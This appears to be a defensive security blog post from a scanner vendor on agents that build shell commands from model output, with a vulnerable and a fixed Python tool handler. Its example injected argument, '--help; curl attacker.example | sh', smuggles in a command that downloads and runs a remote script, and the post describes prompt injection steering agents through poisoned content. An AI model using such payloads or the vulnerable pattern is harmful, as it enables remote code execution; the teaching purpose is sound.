@@ -1,0 +1,139 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ASI05: when your agent builds a shell command out of model output · ASIScan</title>
+<meta name="description" content="A real exec() call built from model output, why input validation misses it, the fix, and how ASIScan&#39;s rules catch it.">
+<link rel="canonical" href="https://asiscan.dev/blog/asi05-unexpected-code-execution">
+<meta property="og:title" content="ASI05: when your agent builds a shell command out of model output · ASIScan">
+<meta property="og:description" content="A real exec() call built from model output, why input validation misses it, the fix, and how ASIScan&#39;s rules catch it.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://asiscan.dev/blog/asi05-unexpected-code-execution">
+<meta property="og:image" content="https://asiscan.dev/og/asiscan.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://asiscan.dev/og/asiscan.png">
+<link rel="alternate" type="application/rss+xml" title="ASIScan blog" href="https://asiscan.dev/blog/rss.xml">
+<style>:root{--bg:#0a0c10;--panel:#11151c;--panel2:#161b24;--line:#232a35;--text:#e6edf3;--dim:#8b96a5;--dimmer:#5f6a78;--acc:#5eead4;--acc2:#2dd4bf;--red:#f87171;--amber:#fbbf24;--mono:ui-monospace,SFMono-Regular,"SF Mono",Menlo,Consolas,monospace;--sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,Helvetica,Arial,sans-serif}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);line-height:1.7;-webkit-font-smoothing:antialiased}
+a{color:var(--acc);text-decoration:none}a:hover{text-decoration:underline}
+.wrap{max-width:720px;margin:0 auto;padding:0 24px}
+nav{border-bottom:1px solid var(--line);position:sticky;top:0;background:rgba(10,12,16,.9);backdrop-filter:blur(12px);z-index:50}
+nav .wrap{max-width:940px;display:flex;align-items:center;justify-content:space-between;height:60px}
+.logo{font-family:var(--mono);font-weight:600;font-size:15px;letter-spacing:-.3px;color:var(--text)}
+.logo span{color:var(--acc)}
+.navlinks{display:flex;gap:22px;align-items:center;font-size:14px}
+.navlinks a{color:var(--dim)}.navlinks a:hover{color:var(--text);text-decoration:none}
+.btn{background:var(--acc);color:#04231f;padding:8px 16px;border-radius:6px;font-weight:600;font-size:14px;display:inline-block}
+.btn:hover{background:var(--acc2);text-decoration:none}
+article{padding:56px 0 40px}
+h1{font-size:clamp(28px,4.4vw,40px);line-height:1.15;letter-spacing:-1px;font-weight:700;margin-bottom:16px}
+h2{font-size:24px;letter-spacing:-.4px;margin:44px 0 14px;padding-top:8px}
+h3{font-size:18px;margin:30px 0 10px;color:var(--text)}
+p{margin:0 0 18px}
+ul,ol{margin:0 0 18px 22px}li{margin-bottom:8px}
+blockquote{border-left:3px solid var(--line);padding-left:18px;color:var(--dim);margin:0 0 18px}
+code{font-family:var(--mono);font-size:13px;background:var(--panel2);border:1px solid var(--line);border-radius:4px;padding:1.5px 5px}
+pre{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:16px;overflow-x:auto;margin:0 0 22px}
+pre code{background:none;border:none;padding:0;font-size:12.5px;line-height:1.65}
+table{width:100%;border-collapse:collapse;margin:0 0 22px;font-size:14.5px}
+th,td{border:1px solid var(--line);padding:9px 12px;text-align:left}
+th{background:var(--panel2);font-weight:600}
+hr{border:none;border-top:1px solid var(--line);margin:36px 0}
+.meta{font-family:var(--mono);font-size:12.5px;color:var(--dimmer);margin-bottom:34px}
+.tags{display:flex;gap:8px;flex-wrap:wrap;margin:0 0 30px}
+.tag{font-family:var(--mono);font-size:11.5px;color:var(--dim);border:1px solid var(--line);border-radius:100px;padding:3px 10px}
+.cta-box{border:1px solid var(--line);background:var(--panel);border-radius:10px;padding:22px;margin:44px 0 0}
+.cta-box p{margin:0 0 14px;color:var(--dim);font-size:15px}
+.cta-box code{font-size:13px}
+.notes{border-top:1px solid var(--line);margin-top:44px;padding-top:20px;font-size:13.5px;color:var(--dimmer)}
+.notes p{margin-bottom:10px}
+.post-list{list-style:none;margin:0;padding:0}
+.post-list li{border-bottom:1px solid var(--line);padding:22px 0;margin:0}
+.post-list h2{font-size:20px;margin:0 0 6px;letter-spacing:-.3px}
+.post-list h2 a{color:var(--text)}
+.post-list h2 a:hover{color:var(--acc);text-decoration:none}
+.post-list p{color:var(--dim);font-size:15px;margin:0 0 8px}
+.post-list .meta{margin:0;font-size:12px}
+footer{border-top:1px solid var(--line);padding:32px 0;margin-top:60px;font-size:13px;color:var(--dimmer)}
+footer .wrap{max-width:940px;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}</style>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"ASI05: when your agent builds a shell command out of model output","description":"A real exec() call built from model output, why input validation misses it, the fix, and how ASIScan's rules catch it.","datePublished":"2026-09-29","dateModified":"2026-09-29","author":{"@type":"Person","name":"Adam Berube"},"publisher":{"@type":"Organization","name":"Protocol 42"},"mainEntityOfPage":"https://asiscan.dev/blog/asi05-unexpected-code-execution"}</script>
+<script>window.va=window.va||function(){(window.vaq=window.vaq||[]).push(arguments);};</script>
+<script defer src="/_vercel/insights/script.js"></script>
+</head>
+<body>
+<nav><div class="wrap">
+  <a class="logo" href="https://asiscan.dev/">ASIScan<span>.dev</span></a>
+  <div class="navlinks">
+    <a href="/blog/">Blog</a>
+    <a href="https://asiscan.dev/#how">How it works</a>
+    <a href="https://asiscan.dev/#pricing">Pricing</a>
+    <a class="btn" href="https://asiscan.dev/#pricing">Get ASIScan</a>
+  </div>
+</div></nav>
+<article><div class="wrap">
+<h1>ASI05: when your agent builds a shell command out of model output</h1>
+<div class="meta">2026-09-29 · Adam Berube, Director, Protocol 42</div>
+<div class="tags"><span class="tag">AIsecurity</span><span class="tag">agent-security</span><span class="tag">ASI05</span></div>
+<p>Twenty-five of the fifty agent repositories in our scan corpus had a code-execution finding. That&#39;s half. Not half doing something exotic — half doing the same three or four things, over and over, because the pattern is easy to write and easy to miss in review.</p>
+<p>This is ASI05: Unexpected Code Execution. It&#39;s the risk on this list that needs the least explaining, which makes it a good place to start if you&#39;re new to this cluster.</p>
+<h2>What the risk actually is</h2>
+<p>Somewhere in your agent, a tool handler takes an argument the model produced and hands it to something that executes: <code>eval()</code>, <code>exec()</code>, a shell call, a subprocess. The model is not a trusted caller. It&#39;s a text generator that has read tool descriptions, retrieved documents, and possibly attacker-controlled content from a web page or a file. If any of that reaches the executed string, whoever controlled the input the model read now controls what your process runs.</p>
+<p>The reflex is to say &quot;we validate user input.&quot; That&#39;s true and it doesn&#39;t help here. The dangerous string isn&#39;t the user&#39;s prompt. It&#39;s the model&#39;s <em>output</em> — the thing your validation layer, if you have one, was written to check the other side of.</p>
+<h2>A concrete failure</h2>
+<p>A common shape, paraphrased from the kind of tool handler that shows up across agent frameworks — not any one project, just the pattern:</p>
+<pre><code class="language-python">def run_tool(tool_call):
+    command = tool_call[&quot;arguments&quot;][&quot;command&quot;]
+    result = subprocess.run(f&quot;git log {command}&quot;, shell=True, capture_output=True)
+    return result.stdout
+</code></pre>
+<p>The model was asked to supply a git ref or flag. It supplies <code>--help; curl attacker.example | sh</code>. <code>shell=True</code> plus string interpolation means the shell parses that semicolon as a command separator, not as an argument. The agent just executed something the model wrote, because a tool description or a piece of retrieved content told the model to.</p>
+<p>Nothing about the user&#39;s original prompt has to be malicious for this to fire. The instruction can arrive through a fetched web page, a retrieved document, or a poisoned tool result three turns earlier. By the time it reaches <code>subprocess.run</code>, it looks exactly like a legitimate argument.</p>
+<h2>The same code done correctly</h2>
+<pre><code class="language-python">ALLOWED_FLAGS = {&quot;--oneline&quot;, &quot;--graph&quot;, &quot;-n&quot;}
+
+def run_tool(tool_call):
+    flag = tool_call[&quot;arguments&quot;][&quot;flag&quot;]
+    if flag not in ALLOWED_FLAGS:
+        raise ValueError(f&quot;flag not permitted: {flag}&quot;)
+    result = subprocess.run(
+        [&quot;git&quot;, &quot;log&quot;, flag],
+        shell=False,
+        capture_output=True,
+        timeout=5,
+    )
+    return result.stdout
+</code></pre>
+<p>Three things changed. The command is an argument array, not an interpolated string, so there&#39;s no shell to parse metacharacters. The flag is checked against an allowlist before it&#39;s used, not just type-checked. And the call has a timeout, so a hung or adversarial process doesn&#39;t hang the agent loop indefinitely — that&#39;s a different rule (ASI08) but it&#39;s the same instinct: assume the thing you&#39;re calling can misbehave.</p>
+<p>If the tool genuinely needs to run arbitrary code — a code-interpreter tool is a legitimate pattern — the fix isn&#39;t an allowlist, it&#39;s a sandbox: no network egress, a resource-limited container, a filesystem the agent can&#39;t escape.</p>
+<h2>How to detect it</h2>
+<p>This is ASI05 in ASIScan, one of eighteen rules covering the OWASP Agentic categories, the OWASP LLM Top 10 2025 numbering, and two EU AI Act Article 50 checks. ASI05 runs both a presence probe and a control probe: it flags <code>eval()</code> or equivalent called on a non-literal value directly, it flags a shell string built by concatenation or interpolation, and — separately — it flags a code-execution tool exposed to the agent with no evidence of sandboxing or egress restriction anywhere in the project, even if no single line looks dangerous on its own.</p>
+<p>That last part matters. Most of these rules aren&#39;t grepping for <code>eval(</code> and calling it a day — they check whether a risk trigger is present <em>and</em> whether the codebase shows evidence of the standard mitigation. A <code>// TODO: sandbox this</code> comment doesn&#39;t count as evidence; comments are stripped before mitigation matching happens.</p>
+<p>In this corpus, ASI05 findings showed up in 25 of 50 repositories, 140 findings total, all flagged critical. It was the second most widespread rule by repository count after ASI03 (identity and privilege issues, 35 of 50).</p>
+<p>Be clear about what this is and isn&#39;t. ASIScan is regex-based, not AST-based. It doesn&#39;t execute a data-flow graph to prove the model&#39;s output reaches the sink — it recognises the shape of the pattern. That means false positives: a hardcoded allowlist check ten lines above a <code>subprocess.run</code> might not be visible to a regex the way it would be to a human reading the function. It also means false negatives: sufficiently indirect flows, wrapped in a few layers of abstraction, won&#39;t match. Precision for the current release is being re-measured across a 50-repository corpus; the last published figure, roughly 55% on five open-source frameworks, was measured against the August 2026 build, before a round of false-positive fixes, and shouldn&#39;t be read as current.</p>
+<p>Framework repositories also legitimately show ASI05 control-probe findings for sandboxing decisions that are the caller&#39;s responsibility, not the framework&#39;s. A finding is a signal to check, not a verdict.</p>
+<h2>Mitigations</h2>
+<p>Don&#39;t build shell strings from model output. Use argument arrays with <code>shell=False</code>. Allowlist the values a model-supplied field is permitted to take wherever the space is small enough to enumerate. Where it isn&#39;t, sandbox: no shell, no filesystem beyond a scratch directory, no outbound network. Put a timeout on anything the agent invokes so a stuck subprocess doesn&#39;t become a stuck agent. None of this is exotic. It&#39;s the same discipline that&#39;s applied to user input for twenty years, applied to a new source of untrusted text.</p>
+<h2>Notes</h2>
+<p>Findings from this rule, and from every rule in ASIScan, are static-analysis signals for a human to review — not confirmed vulnerabilities and not a compliance determination. This produces evidence for human assessment. It does not establish compliance with the EU AI Act or any other regulation. Not affiliated with or endorsed by OWASP. OWASP is a registered trademark of the OWASP Foundation.</p>
+<p>Run <code>npx asiscan-cli .</code> against your own agent code and see what ASI05 turns up.</p>
+
+<div class="cta-box">
+  <p>ASIScan audits an AI agent codebase against all ten OWASP Agentic categories, the LLM Top 10 and EU AI Act Article 50, and writes the evidence document.</p>
+  <p><code>npx asiscan-cli .</code></p>
+  <a class="btn" href="https://asiscan.dev/#pricing">See what it checks</a>
+</div>
+<div class="notes">
+  <p>Not affiliated with or endorsed by OWASP. OWASP is a registered trademark of the OWASP Foundation.</p>
+  <p>This produces evidence for human assessment. It does not establish compliance with the EU AI Act or any other regulation.</p>
+</div>
+</div></article>
+<footer><div class="wrap">
+  <div>&copy; 2026 Protocol 42 · Ontario, Canada</div>
+  <div>Not affiliated with or endorsed by OWASP. OWASP is a registered trademark of the OWASP Foundation.</div>
+</div></footer>
+</body>
+</html>
